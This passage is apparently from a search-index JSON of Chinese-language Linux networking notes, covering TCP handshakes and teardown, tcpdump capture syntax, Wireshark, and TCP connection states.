<\u76ee\u6807IP>\uff1a\u60a8\u8981\u626b\u63cf\u7684\u76ee\u6807IP\u5730\u5740\u3002 Nmap\u4f7f\u7528\u6559\u7a0b\uff08\u521d\u7ea7\u7bc7\uff09 - zha0gongz1 - \u535a\u5ba2\u56ed (cnblogs.com) Nmap\u4f7f\u7528\u6559\u7a0b\uff08\u8fdb\u9636\u7bc7\uff09 - zha0gongz1 - \u535a\u5ba2\u56ed (cnblogs.com) (42\u6761\u6d88\u606f) Nmap\u5e38\u7528\u547d\u4ee4_\u767e\u5bc6\u4e0d\u758f\u7684\u535a\u5ba2-CSDN\u535a\u5ba2","title":"NMAP\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcp/","text":"TCP \u7ecf\u5178\u7684\u4e09\u6b21\u63e1\u624b\u793a\u610f\u56fe\uff1a \u7ecf\u5178\u7684\u56db\u6b21\u63e1\u624b\u5173\u95ed\u56fe\uff1a 1.\u77ed\u8fde\u63a5 \u8fde\u63a5->\u4f20\u8f93\u6570\u636e->\u5173\u95ed\u8fde\u63a5 \u77ed\u8fde\u63a5\u662f\u6307\u901a\u4fe1\u53cc\u65b9\u6709\u6570\u636e\u4ea4\u4e92\u65f6\uff0c\u5c31\u5efa\u7acb\u4e00\u4e2aTCP\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64TCP\u8fde\u63a5\uff0c 2.\u957f\u8fde\u63a5 \u8fde\u63a5->\u4f20\u8f93\u6570\u636e->\u4fdd\u6301\u8fde\u63a5->\u4f20\u8f93\u6570\u636e->....->\u5173\u95ed\u8fde\u63a5 \u957f\u8fde\u63a5\u6307\u5efa\u7acbTCP\u8fde\u63a5\u540e\u4e0d\u7ba1\u662f\u5426\u4f7f\u7528\u90fd\u4fdd\u6301\u8fde\u63a5\uff0c\u4f46\u5b89\u5168\u6027\u8f83\u5dee\u3002","title":"TCP\u56fe\u89e3"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcp/#tcp","text":"\u7ecf\u5178\u7684\u4e09\u6b21\u63e1\u624b\u793a\u610f\u56fe\uff1a \u7ecf\u5178\u7684\u56db\u6b21\u63e1\u624b\u5173\u95ed\u56fe\uff1a","title":"TCP"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcp/#1","text":"\u8fde\u63a5->\u4f20\u8f93\u6570\u636e->\u5173\u95ed\u8fde\u63a5 \u77ed\u8fde\u63a5\u662f\u6307\u901a\u4fe1\u53cc\u65b9\u6709\u6570\u636e\u4ea4\u4e92\u65f6\uff0c\u5c31\u5efa\u7acb\u4e00\u4e2aTCP\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64TCP\u8fde\u63a5\uff0c","title":"1.\u77ed\u8fde\u63a5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcp/#2","text":"\u8fde\u63a5->\u4f20\u8f93\u6570\u636e->\u4fdd\u6301\u8fde\u63a5->\u4f20\u8f93\u6570\u636e->....->\u5173\u95ed\u8fde\u63a5 \u957f\u8fde\u63a5\u6307\u5efa\u7acbTCP\u8fde\u63a5\u540e\u4e0d\u7ba1\u662f\u5426\u4f7f\u7528\u90fd\u4fdd\u6301\u8fde\u63a5\uff0c\u4f46\u5b89\u5168\u6027\u8f83\u5dee\u3002","title":"2.\u957f\u8fde\u63a5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcpdump/","text":"tcpdump \u6211\u4eec\u77e5\u9053\uff0ctcpdump \u4e5f\u662f\u6700\u5e38\u7528\u7684\u4e00\u4e2a\u7f51\u7edc\u5206\u6790\u5de5\u5177\u3002\u5b83\u57fa\u4e8e libpcap \uff0c\u5229\u7528\u5185\u6838\u4e2d\u7684 AF_PACKET \u5957\u63a5\u5b57\uff0c\u6293\u53d6\u7f51\u7edc\u63a5\u53e3\u4e2d\u4f20\u8f93\u7684\u7f51\u7edc\u5305\uff1b\u5e76\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u8fc7\u6ee4\u89c4\u5219\uff0c\u5e2e\u4f60\u4ece\u5927\u91cf\u7684\u7f51\u7edc\u5305\u4e2d\uff0c\u6311\u51fa\u6700\u60f3\u5173\u6ce8\u7684\u4fe1\u606f\u3002tcpdump \u4e3a\u4f60\u5c55\u793a\u4e86\u6bcf\u4e2a\u7f51\u7edc\u5305\u7684\u8be6\u7ec6\u7ec6\u8282\uff0c\u8fd9\u5c31\u8981\u6c42\uff0c\u5728\u4f7f\u7528\u524d\uff0c\u4f60\u5fc5\u987b\u8981\u5bf9\u7f51\u7edc\u534f\u8bae\u6709\u57fa\u672c\u4e86\u89e3\u3002\u800c\u8981\u4e86\u89e3\u7f51\u7edc\u534f\u8bae\u7684\u8be6\u7ec6\u8bbe\u8ba1\u548c\u5b9e\u73b0\u7ec6\u8282\uff0c RFC \u5f53\u7136\u662f\u6700\u6743\u5a01\u7684\u8d44\u6599\u3002 \u5e38\u89c1\u7684\u6536\u96c6\u547d\u4ee4\uff1a $tcpdump -i en0 -nn tcp -p -w Desktop/file.pcnp \u6307\u5b9a\u7f51\u5361\uff0ctcp\u7c7b\u578b\uff0c\u7981\u6b62\u6df7\u6742\u6a21\u5f0f\uff0c\u4fdd\u5b58\u5230\u6587\u4ef6 \u8bed\u6cd5\uff1a \u5b83\u7684\u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u4e5f\u5c31\u662f tcpdump [\u9009\u9879] [\u8fc7\u6ee4\u8868\u8fbe\u5f0f]\u3002\u5f53\u7136\uff0c\u9009\u9879\u548c\u8868\u8fbe\u5f0f\u7684\u5916\u9762\u90fd\u52a0\u4e86\u4e2d\u62ec\u53f7\uff0c\u8868\u660e\u5b83\u4eec\u90fd\u662f\u53ef\u9009\u7684\u3002 $ tcpdump -nn udp port 53 or host 35.190.27.188 -nn \uff0c\u8868\u793a\u4e0d\u89e3\u6790\u6293\u5305\u4e2d\u7684\u57df\u540d\uff08\u5373\u4e0d\u53cd\u5411\u89e3\u6790\uff09\u3001\u534f\u8bae\u4ee5\u53ca\u7aef\u53e3\u53f7\u3002 udp port 53 \uff0c\u8868\u793a\u53ea\u663e\u793a UDP \u534f\u8bae\u7684\u7aef\u53e3\u53f7\uff08\u5305\u62ec\u6e90\u7aef\u53e3\u548c\u76ee\u7684\u7aef\u53e3\uff09\u4e3a 53 \u7684\u5305\u3002 host 35.190.27.188 \uff0c\u8868\u793a\u53ea\u663e\u793a IP \u5730\u5740\uff08\u5305\u62ec\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\uff09\u4e3a 35.190.27.188 \u7684\u5305\u3002 \u8fd9\u4e24\u4e2a\u8fc7\u6ee4\u6761\u4ef6\u4e2d\u95f4\u7684\u201c or \u201d\uff0c\u8868\u793a\u6216\u7684\u5173\u7cfb\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8981\u6ee1\u8db3\u4e0a\u9762\u4e24\u4e2a\u6761\u4ef6\u4e2d\u7684\u4efb\u4e00\u4e2a\uff0c\u5c31\u53ef\u4ee5\u5c55\u793a\u51fa\u6765\u3002 \u521a\u521a\u7528\u8fc7\u7684\u662f udp port 53 or host 35.190.27.188 \uff0c\u8868\u793a\u6293\u53d6 DNS \u534f\u8bae\u7684\u8bf7\u6c42\u548c\u54cd\u5e94\u5305\uff0c\u4ee5\u53ca\u6e90\u5730\u5740\u6216\u76ee\u7684\u5730\u5740\u4e3a 35.190.27.188 \u7684\u5305\u3002 \u6700\u540e\uff0c\u518d\u6b21\u5f3a\u8c03 tcpdump \u7684\u8f93\u51fa\u683c\u5f0f\uff0c\u6211\u5728\u524d\u9762\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u5b83\u7684\u57fa\u672c\u683c\u5f0f\uff1a \u65f6\u95f4\u6233 \u534f\u8bae \u6e90\u5730\u5740.\u6e90\u7aef\u53e3 > \u76ee\u7684\u5730\u5740.\u76ee\u7684\u7aef\u53e3 \u7f51\u7edc\u5305\u8be6\u7ec6\u4fe1\u606f Wireshark Wireshark \u4e5f\u662f\u6700\u6d41\u884c\u7684\u4e00\u4e2a\u7f51\u7edc\u5206\u6790\u5de5\u5177\uff0c\u5b83\u6700\u5927\u7684\u597d\u5904\u5c31\u662f\u63d0\u4f9b\u4e86\u8de8\u5e73\u53f0\u7684\u56fe\u5f62\u754c\u9762\u3002\u8ddf tcpdump \u7c7b\u4f3c\uff0cWireshark \u4e5f\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u8fc7\u6ee4\u89c4\u5219\u8868\u8fbe\u5f0f\uff0c\u540c\u65f6\uff0c\u8fd8\u5185\u7f6e\u4e86\u4e00\u7cfb\u5217\u7684\u6c47\u603b\u5206\u6790\u5de5\u5177\u3002 $ tcpdump -nn udp port 53 or host 35.190.27.188 -w ping.pcap \u7136\u540e\uff0c\u518d\u7528 Wireshark \u6253\u5f00\u5b83\u3002\u6253\u5f00\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u770b\u5230\u4e0b\u9762\u8fd9\u4e2a\u754c\u9762\uff1a TCP \u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b\u5f88\u7c7b\u4f3c\uff0c\u4f5c\u4e3a\u5bf9\u6bd4\uff0c \u4f60\u901a\u5e38\u770b\u5230\u7684 TCP \u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b\u7684\u6d41\u7a0b\uff0c\u57fa\u672c\u662f\u8fd9\u6837\u7684\uff1a \u5bf9\u6bd4\u8fd9\u4e24\u5f20\u56fe\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u8fd9\u91cc\u6293\u5230\u7684\u5305\u8ddf\u4e0a\u9762\u7684\u56db\u6b21\u6325\u624b\uff0c\u5e76\u4e0d\u5b8c\u5168\u4e00\u6837\uff0c\u5b9e\u9645\u6325\u624b\u8fc7\u7a0b\u53ea\u6709\u4e09\u4e2a\u5305\uff0c\u800c\u4e0d\u662f\u56db\u4e2a\u3002 \u5176\u5b9e\uff0c\u4e4b\u6240\u4ee5\u6709\u4e09\u4e2a\u5305\uff0c\u662f\u56e0\u4e3a\u670d\u52a1\u5668\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u7684 FIN \u540e\uff0c\u670d\u52a1\u5668\u7aef\u540c\u65f6\u4e5f\u8981\u5173\u95ed\u8fde\u63a5\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a ACK \u548c FIN \u5408\u5e76\u5230\u4e00\u8d77\u53d1\u9001\uff0c\u8282\u7701\u4e86\u4e00\u4e2a\u5305\uff0c\u53d8\u6210\u4e86\u201c\u4e09\u6b21\u6325\u624b\u201d\u3002 \u800c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u670d\u52a1\u5668\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u7684 FIN \u540e\uff0c\u5f88\u53ef\u80fd\u8fd8\u6ca1\u53d1\u9001\u5b8c\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u4f1a\u5148\u56de\u590d\u5ba2\u6237\u7aef\u4e00\u4e2a ACK \u5305\u3002\u7a0d\u7b49\u4e00\u4f1a\u513f\uff0c\u5b8c\u6210\u6240\u6709\u6570\u636e\u5305\u7684\u53d1\u9001\u540e\uff0c\u624d\u4f1a\u53d1\u9001 FIN \u5305\u3002\u8fd9\u4e5f\u5c31\u662f\u56db\u6b21\u6325\u624b\u4e86\u3002 tcpdump\u624b\u518c tcpdump(1) man page | TCPDUMP & LIBPCAP \u4e2d\u6587\u624b\u518c tcpdump(8) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages","title":"tcpdump"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcpdump/#tcpdump","text":"\u6211\u4eec\u77e5\u9053\uff0ctcpdump \u4e5f\u662f\u6700\u5e38\u7528\u7684\u4e00\u4e2a\u7f51\u7edc\u5206\u6790\u5de5\u5177\u3002\u5b83\u57fa\u4e8e libpcap \uff0c\u5229\u7528\u5185\u6838\u4e2d\u7684 AF_PACKET \u5957\u63a5\u5b57\uff0c\u6293\u53d6\u7f51\u7edc\u63a5\u53e3\u4e2d\u4f20\u8f93\u7684\u7f51\u7edc\u5305\uff1b\u5e76\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u8fc7\u6ee4\u89c4\u5219\uff0c\u5e2e\u4f60\u4ece\u5927\u91cf\u7684\u7f51\u7edc\u5305\u4e2d\uff0c\u6311\u51fa\u6700\u60f3\u5173\u6ce8\u7684\u4fe1\u606f\u3002tcpdump \u4e3a\u4f60\u5c55\u793a\u4e86\u6bcf\u4e2a\u7f51\u7edc\u5305\u7684\u8be6\u7ec6\u7ec6\u8282\uff0c\u8fd9\u5c31\u8981\u6c42\uff0c\u5728\u4f7f\u7528\u524d\uff0c\u4f60\u5fc5\u987b\u8981\u5bf9\u7f51\u7edc\u534f\u8bae\u6709\u57fa\u672c\u4e86\u89e3\u3002\u800c\u8981\u4e86\u89e3\u7f51\u7edc\u534f\u8bae\u7684\u8be6\u7ec6\u8bbe\u8ba1\u548c\u5b9e\u73b0\u7ec6\u8282\uff0c RFC \u5f53\u7136\u662f\u6700\u6743\u5a01\u7684\u8d44\u6599\u3002 \u5e38\u89c1\u7684\u6536\u96c6\u547d\u4ee4\uff1a $tcpdump -i en0 -nn tcp -p -w Desktop/file.pcnp \u6307\u5b9a\u7f51\u5361\uff0ctcp\u7c7b\u578b\uff0c\u7981\u6b62\u6df7\u6742\u6a21\u5f0f\uff0c\u4fdd\u5b58\u5230\u6587\u4ef6","title":"tcpdump"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcpdump/#_1","text":"\u5b83\u7684\u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u4e5f\u5c31\u662f tcpdump [\u9009\u9879] [\u8fc7\u6ee4\u8868\u8fbe\u5f0f]\u3002\u5f53\u7136\uff0c\u9009\u9879\u548c\u8868\u8fbe\u5f0f\u7684\u5916\u9762\u90fd\u52a0\u4e86\u4e2d\u62ec\u53f7\uff0c\u8868\u660e\u5b83\u4eec\u90fd\u662f\u53ef\u9009\u7684\u3002 $ tcpdump -nn udp port 53 or host 35.190.27.188 -nn \uff0c\u8868\u793a\u4e0d\u89e3\u6790\u6293\u5305\u4e2d\u7684\u57df\u540d\uff08\u5373\u4e0d\u53cd\u5411\u89e3\u6790\uff09\u3001\u534f\u8bae\u4ee5\u53ca\u7aef\u53e3\u53f7\u3002 udp port 53 \uff0c\u8868\u793a\u53ea\u663e\u793a UDP \u534f\u8bae\u7684\u7aef\u53e3\u53f7\uff08\u5305\u62ec\u6e90\u7aef\u53e3\u548c\u76ee\u7684\u7aef\u53e3\uff09\u4e3a 53 \u7684\u5305\u3002 host 35.190.27.188 \uff0c\u8868\u793a\u53ea\u663e\u793a IP \u5730\u5740\uff08\u5305\u62ec\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\uff09\u4e3a 35.190.27.188 \u7684\u5305\u3002 \u8fd9\u4e24\u4e2a\u8fc7\u6ee4\u6761\u4ef6\u4e2d\u95f4\u7684\u201c or \u201d\uff0c\u8868\u793a\u6216\u7684\u5173\u7cfb\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8981\u6ee1\u8db3\u4e0a\u9762\u4e24\u4e2a\u6761\u4ef6\u4e2d\u7684\u4efb\u4e00\u4e2a\uff0c\u5c31\u53ef\u4ee5\u5c55\u793a\u51fa\u6765\u3002 \u521a\u521a\u7528\u8fc7\u7684\u662f udp port 53 or host 35.190.27.188 \uff0c\u8868\u793a\u6293\u53d6 DNS \u534f\u8bae\u7684\u8bf7\u6c42\u548c\u54cd\u5e94\u5305\uff0c\u4ee5\u53ca\u6e90\u5730\u5740\u6216\u76ee\u7684\u5730\u5740\u4e3a 35.190.27.188 \u7684\u5305\u3002 \u6700\u540e\uff0c\u518d\u6b21\u5f3a\u8c03 tcpdump \u7684\u8f93\u51fa\u683c\u5f0f\uff0c\u6211\u5728\u524d\u9762\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u5b83\u7684\u57fa\u672c\u683c\u5f0f\uff1a \u65f6\u95f4\u6233 \u534f\u8bae \u6e90\u5730\u5740.\u6e90\u7aef\u53e3 > \u76ee\u7684\u5730\u5740.\u76ee\u7684\u7aef\u53e3 \u7f51\u7edc\u5305\u8be6\u7ec6\u4fe1\u606f","title":"\u8bed\u6cd5\uff1a"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/tcpdump/#wireshark","text":"Wireshark \u4e5f\u662f\u6700\u6d41\u884c\u7684\u4e00\u4e2a\u7f51\u7edc\u5206\u6790\u5de5\u5177\uff0c\u5b83\u6700\u5927\u7684\u597d\u5904\u5c31\u662f\u63d0\u4f9b\u4e86\u8de8\u5e73\u53f0\u7684\u56fe\u5f62\u754c\u9762\u3002\u8ddf tcpdump \u7c7b\u4f3c\uff0cWireshark \u4e5f\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u8fc7\u6ee4\u89c4\u5219\u8868\u8fbe\u5f0f\uff0c\u540c\u65f6\uff0c\u8fd8\u5185\u7f6e\u4e86\u4e00\u7cfb\u5217\u7684\u6c47\u603b\u5206\u6790\u5de5\u5177\u3002 $ tcpdump -nn udp port 53 or host 35.190.27.188 -w ping.pcap \u7136\u540e\uff0c\u518d\u7528 Wireshark \u6253\u5f00\u5b83\u3002\u6253\u5f00\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u770b\u5230\u4e0b\u9762\u8fd9\u4e2a\u754c\u9762\uff1a TCP \u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b\u5f88\u7c7b\u4f3c\uff0c\u4f5c\u4e3a\u5bf9\u6bd4\uff0c \u4f60\u901a\u5e38\u770b\u5230\u7684 TCP \u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b\u7684\u6d41\u7a0b\uff0c\u57fa\u672c\u662f\u8fd9\u6837\u7684\uff1a \u5bf9\u6bd4\u8fd9\u4e24\u5f20\u56fe\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u8fd9\u91cc\u6293\u5230\u7684\u5305\u8ddf\u4e0a\u9762\u7684\u56db\u6b21\u6325\u624b\uff0c\u5e76\u4e0d\u5b8c\u5168\u4e00\u6837\uff0c\u5b9e\u9645\u6325\u624b\u8fc7\u7a0b\u53ea\u6709\u4e09\u4e2a\u5305\uff0c\u800c\u4e0d\u662f\u56db\u4e2a\u3002 \u5176\u5b9e\uff0c\u4e4b\u6240\u4ee5\u6709\u4e09\u4e2a\u5305\uff0c\u662f\u56e0\u4e3a\u670d\u52a1\u5668\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u7684 FIN \u540e\uff0c\u670d\u52a1\u5668\u7aef\u540c\u65f6\u4e5f\u8981\u5173\u95ed\u8fde\u63a5\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u628a ACK \u548c FIN \u5408\u5e76\u5230\u4e00\u8d77\u53d1\u9001\uff0c\u8282\u7701\u4e86\u4e00\u4e2a\u5305\uff0c\u53d8\u6210\u4e86\u201c\u4e09\u6b21\u6325\u624b\u201d\u3002 \u800c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u670d\u52a1\u5668\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u7684 FIN \u540e\uff0c\u5f88\u53ef\u80fd\u8fd8\u6ca1\u53d1\u9001\u5b8c\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u4f1a\u5148\u56de\u590d\u5ba2\u6237\u7aef\u4e00\u4e2a ACK \u5305\u3002\u7a0d\u7b49\u4e00\u4f1a\u513f\uff0c\u5b8c\u6210\u6240\u6709\u6570\u636e\u5305\u7684\u53d1\u9001\u540e\uff0c\u624d\u4f1a\u53d1\u9001 FIN \u5305\u3002\u8fd9\u4e5f\u5c31\u662f\u56db\u6b21\u6325\u624b\u4e86\u3002 tcpdump\u624b\u518c tcpdump(1) man page | TCPDUMP & LIBPCAP \u4e2d\u6587\u624b\u518c tcpdump(8) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages","title":"Wireshark"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/time_wait/","text":"TIME_WAIT\u8fc7\u591a\u7684\u89e3\u51b3\u65b9\u6cd5 \u4e0a\u56fe\u5bf9\u6392\u9664\u548c\u5b9a\u4f4d\u7f51\u7edc\u6216\u7cfb\u7edf\u6545\u969c\u65f6\u5927\u6709\u5e2e\u52a9\uff0c\u4f46\u662f\u600e\u6837\u7262\u7262\u5730\u5c06\u8fd9\u5f20\u56fe\u523b\u5728\u8111\u4e2d\u5462\uff1f\u90a3\u4e48\u4f60\u5c31\u4e00\u5b9a\u8981\u5bf9\u8fd9\u5f20\u56fe\u7684\u6bcf\u4e00\u4e2a\u72b6\u6001\uff0c\u53ca\u8f6c\u6362\u7684\u8fc7\u7a0b\u6709\u6df1\u523b\u5730\u8ba4\u8bc6\uff0c\u4e0d\u80fd\u53ea\u505c\u7559\u5728\u4e00\u77e5\u534a\u89e3\u4e4b\u4e2d\u3002\u4e0b\u9762\u5bf9\u8fd9\u5f20\u56fe\u768411\u79cd\u72b6\u6001\u8be6\u7ec6\u89e3\u91ca\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u52a0\u5f3a\u8bb0\u5fc6\uff01\u4e0d\u8fc7\u5728\u8fd9\u4e4b\u524d\uff0c\u5148\u56de\u987e\u4e00\u4e0bTCP\u5efa\u7acb\u8fde\u63a5\u7684\u4e09\u6b21\u63e1\u624b\u8fc7\u7a0b\uff0c\u4ee5\u53ca\u5173\u95ed\u8fde\u63a5\u7684\u56db\u6b21\u63e1\u624b\u8fc7\u7a0b\u3002 1\u3001\u5efa\u7acb\u8fde\u63a5\u534f\u8bae\uff08\u4e09\u6b21\u63e1\u624b\uff09 \u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u5e26SYN\u6807\u5fd7\u7684TCP\u62a5\u6587\u5230\u670d\u52a1\u5668\u3002\u8fd9\u662f\u4e09\u6b21\u63e1\u624b\u8fc7\u7a0b\u4e2d\u7684\u62a5\u65871\u3002 \u670d\u52a1\u5668\u7aef\u56de\u5e94\u5ba2\u6237\u7aef\u7684\uff0c\u8fd9\u662f\u4e09\u6b21\u63e1\u624b\u4e2d\u7684\u7b2c2\u4e2a\u62a5\u6587\uff0c\u8fd9\u4e2a\u62a5\u6587\u540c\u65f6\u5e26ACK\u6807\u5fd7\u548cSYN\u6807\u5fd7\u3002\u56e0\u6b64\u5b83\u8868\u793a\u5bf9\u521a\u624d\u5ba2\u6237\u7aefSYN\u62a5\u6587\u7684\u56de\u5e94\uff1b\u540c\u65f6\u53c8\u6807\u5fd7SYN\u7ed9\u5ba2\u6237\u7aef\uff0c\u8be2\u95ee\u5ba2\u6237\u7aef\u662f\u5426\u51c6\u5907\u597d\u8fdb\u884c\u6570\u636e\u901a\u8baf\u3002 \u5ba2\u6237\u5fc5\u987b\u518d\u6b21\u56de\u5e94\u670d\u52a1\u6bb5\u4e00\u4e2aACK\u62a5\u6587\uff0c\u8fd9\u662f\u62a5\u6587\u6bb53\u3002 2\u3001\u8fde\u63a5\u7ec8\u6b62\u534f\u8bae\uff08\u56db\u6b21\u63e1\u624b\uff09 \u7531\u4e8eTCP\u8fde\u63a5\u662f\u5168\u53cc\u5de5\u7684\uff0c\u56e0\u6b64\u6bcf\u4e2a\u65b9\u5411\u90fd\u5fc5\u987b\u5355\u72ec\u8fdb\u884c\u5173\u95ed\u3002\u8fd9\u539f\u5219\u662f\u5f53\u4e00\u65b9\u5b8c\u6210\u5b83\u7684\u6570\u636e\u53d1\u9001\u4efb\u52a1\u540e\u5c31\u80fd\u53d1\u9001\u4e00\u4e2aFIN\u6765\u7ec8\u6b62\u8fd9\u4e2a\u65b9\u5411\u7684\u8fde\u63a5\u3002\u6536\u5230\u4e00\u4e2a FIN\u53ea\u610f\u5473\u7740\u8fd9\u4e00\u65b9\u5411\u4e0a\u6ca1\u6709\u6570\u636e\u6d41\u52a8\uff0c\u4e00\u4e2aTCP\u8fde\u63a5\u5728\u6536\u5230\u4e00\u4e2aFIN\u540e\u4ecd\u80fd\u53d1\u9001\u6570\u636e\u3002\u9996\u5148\u8fdb\u884c\u5173\u95ed\u7684\u4e00\u65b9\u5c06\u6267\u884c\u4e3b\u52a8\u5173\u95ed\uff0c\u800c\u53e6\u4e00\u65b9\u6267\u884c\u88ab\u52a8\u5173\u95ed\u3002 TCP\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2aFIN\uff0c\u7528\u6765\u5173\u95ed\u5ba2\u6237\u5230\u670d\u52a1\u5668\u7684\u6570\u636e\u4f20\u9001\uff08\u62a5\u6587\u6bb54\uff09\u3002 \u670d\u52a1\u5668\u6536\u5230\u8fd9\u4e2aFIN\uff0c\u5b83\u53d1\u56de\u4e00\u4e2aACK\uff0c\u786e\u8ba4\u5e8f\u53f7\u4e3a\u6536\u5230\u7684\u5e8f\u53f7\u52a01\uff08\u62a5\u6587\u6bb55\uff09\u3002\u548cSYN\u4e00\u6837\uff0c\u4e00\u4e2aFIN\u5c06\u5360\u7528\u4e00\u4e2a\u5e8f\u53f7\u3002 \u670d\u52a1\u5668\u5173\u95ed\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff0c\u53d1\u9001\u4e00\u4e2aFIN\u7ed9\u5ba2\u6237\u7aef\uff08\u62a5\u6587\u6bb56\uff09\u3002 \u5ba2\u6237\u6bb5\u53d1\u56deACK\u62a5\u6587\u786e\u8ba4\uff0c\u5e76\u5c06\u786e\u8ba4\u5e8f\u53f7\u8bbe\u7f6e\u4e3a\u6536\u5230\u5e8f\u53f7\u52a01\uff08\u62a5\u6587\u6bb57\uff09\u3002 CLOSED\uff1a\u8fd9\u4e2a\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\u4e86\uff0c\u8868\u793a\u521d\u59cb\u72b6\u6001\u3002 LISTEN\uff1a\u8fd9\u4e2a\u4e5f\u662f\u975e\u5e38\u5bb9\u6613\u7406\u89e3\u7684\u4e00\u4e2a\u72b6\u6001\uff0c\u8868\u793a\u670d\u52a1\u5668\u7aef\u7684\u67d0\u4e2aSOCKET\u5904\u4e8e\u76d1\u542c\u72b6\u6001\uff0c\u53ef\u4ee5\u63a5\u53d7\u8fde\u63a5\u4e86\u3002 SYN_RCVD\uff1a\u8fd9\u4e2a\u72b6\u6001\u8868\u793a\u63a5\u53d7\u5230\u4e86SYN\u62a5\u6587\uff0c\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u72b6\u6001\u662f\u670d\u52a1\u5668\u7aef\u7684SOCKET\u5728\u5efa\u7acbTCP\u8fde\u63a5\u65f6\u7684\u4e09\u6b21\u63e1\u624b\u4f1a\u8bdd\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a\u4e2d\u95f4\u72b6\u6001\uff0c\u5f88\u77ed\u6682\uff0c\u57fa\u672c\u4e0a\u7528netstat\u4f60\u662f\u5f88\u96be\u770b\u5230\u8fd9\u79cd\u72b6\u6001\u7684\uff0c\u9664\u975e\u4f60\u7279\u610f\u5199\u4e86\u4e00\u4e2a\u5ba2\u6237\u7aef\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u6545\u610f\u5c06\u4e09\u6b21TCP\u63e1\u624b\u8fc7\u7a0b\u4e2d\u6700\u540e\u4e00\u4e2aACK\u62a5\u6587\u4e0d\u4e88\u53d1\u9001\u3002\u56e0\u6b64\u8fd9\u79cd\u72b6\u6001\u65f6\uff0c\u5f53\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u62a5\u6587\u540e\uff0c\u5b83\u4f1a\u8fdb\u5165\u5230ESTABLISHED\u72b6\u6001\u3002 SYN_SENT\uff1a\u8fd9\u4e2a\u72b6\u6001\u4e0eSYN_RCVD\u9065\u60f3\u547c\u5e94\uff0c\u5f53\u5ba2\u6237\u7aefSOCKET\u6267\u884cCONNECT\u8fde\u63a5\u65f6\uff0c\u5b83\u9996\u5148\u53d1\u9001SYN\u62a5\u6587\uff0c\u56e0\u6b64\u4e5f\u968f\u5373\u5b83\u4f1a\u8fdb\u5165\u5230\u4e86SYN_SENT\u72b6\u6001\uff0c\u5e76\u7b49\u5f85\u670d\u52a1\u7aef\u7684\u53d1\u9001\u4e09\u6b21\u63e1\u624b\u4e2d\u7684\u7b2c2\u4e2a\u62a5\u6587\u3002SYN_SENT\u72b6\u6001\u8868\u793a\u5ba2\u6237\u7aef\u5df2\u53d1\u9001SYN\u62a5\u6587\u3002 ESTABLISHED\uff1a\u8fd9\u4e2a\u5bb9\u6613\u7406\u89e3\u4e86\uff0c\u8868\u793a\u8fde\u63a5\u5df2\u7ecf\u5efa\u7acb\u4e86\u3002 